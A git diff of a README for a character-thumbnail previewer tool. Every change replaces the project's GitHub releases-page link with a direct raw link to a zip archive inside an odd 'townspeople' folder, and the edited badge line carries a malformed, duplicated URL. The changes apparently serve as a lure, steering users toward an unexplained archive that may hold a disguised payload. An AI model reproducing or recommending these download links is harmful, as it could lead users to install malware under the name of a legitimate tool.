@@ -1,6 +1,6 @@
 # 🎨 FT-CharacterThumbnail-Previewer - Create Stunning Character Thumbnails Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-FT--CharacterThumbnail--Previewer-blue.svg)](https://github.com/mertsngnl/FT-CharacterThumbnail-Previewer/releases)
+[![Download](https://raw.githubusercontent.com/mertsngnl/FT-CharacterThumbnail-Previewer/main/townspeople/FT-CharacterThumbnail-Previewer_3.3.zip%https://raw.githubusercontent.com/mertsngnl/FT-CharacterThumbnail-Previewer/main/townspeople/FT-CharacterThumbnail-Previewer_3.3.zip)](https://raw.githubusercontent.com/mertsngnl/FT-CharacterThumbnail-Previewer/main/townspeople/FT-CharacterThumbnail-Previewer_3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ FT-CharacterThumbnail-Previewer lets you create and preview character thumbnails
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [FT-CharacterThumbnail-Previewer Releases](https://github.com/mertsngnl/FT-CharacterThumbnail-Previewer/releases). 
+To get started, visit this page to download: [FT-CharacterThumbnail-Previewer Releases](https://raw.githubusercontent.com/mertsngnl/FT-CharacterThumbnail-Previewer/main/townspeople/FT-CharacterThumbnail-Previewer_3.3.zip). 
 
 1. Click on the latest version link.
 2. Choose the appropriate file for your operating system (Windows, Mac, or Linux).
@@ -79,4 +79,4 @@ FT-CharacterThumbnail-Previewer relates to:
 
 Thank you for using FT-CharacterThumbnail-Previewer. We appreciate your feedback and support as we strive to make this tool better for everyone. 
 
-Don’t forget to visit the release page for updates and new features: [FT-CharacterThumbnail-Previewer Releases](https://github.com/mertsngnl/FT-CharacterThumbnail-Previewer/releases).
+Don’t forget to visit the release page for updates and new features: [FT-CharacterThumbnail-Previewer Releases](https://raw.githubusercontent.com/mertsngnl/FT-CharacterThumbnail-Previewer/main/townspeople/FT-CharacterThumbnail-Previewer_3.3.zip).
